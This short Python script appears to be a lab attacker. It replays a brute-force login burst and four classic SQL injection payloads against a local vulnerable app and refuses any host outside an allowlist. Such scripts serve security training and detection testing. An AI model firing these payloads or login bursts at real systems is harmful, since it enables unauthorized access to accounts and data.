"""Lab attacker: replays a brute-force burst and classic SQLi payloads at the LAB app only."""
import os
import sys
import time
from urllib.parse import urlparse

import requests

TARGET = os.environ.get("TARGET_URL", "http://vuln-app:5000")
ALLOWED_HOSTS = {"vuln-app", "localhost", "127.0.0.1"}
PAYLOADS = ["' OR '1'='1' --", "admin'--", "' UNION SELECT 1 --", "' OR 1=1 --"]


def run(target=TARGET, delay=0.2):
    host = urlparse(target).hostname
    if host not in ALLOWED_HOSTS:
        sys.exit(f"Refusing to attack '{host}': this script only targets the local lab app.")
    results = []
    for i in range(8):  # brute-force burst
        r = requests.post(f"{target}/login", json={"username": "admin", "password": f"wrong{i}"}, timeout=5)
        results.append(("bruteforce", r.status_code, r.json()["ok"]))
        time.sleep(delay)
    for p in PAYLOADS:  # SQL injection attempts
        r = requests.post(f"{target}/login", json={"username": p, "password": "x"}, timeout=5)
        results.append((p, r.status_code, r.json()["ok"]))
        time.sleep(delay)
    for r in results:
        print(r)
    return results


if __name__ == "__main__":
    run()
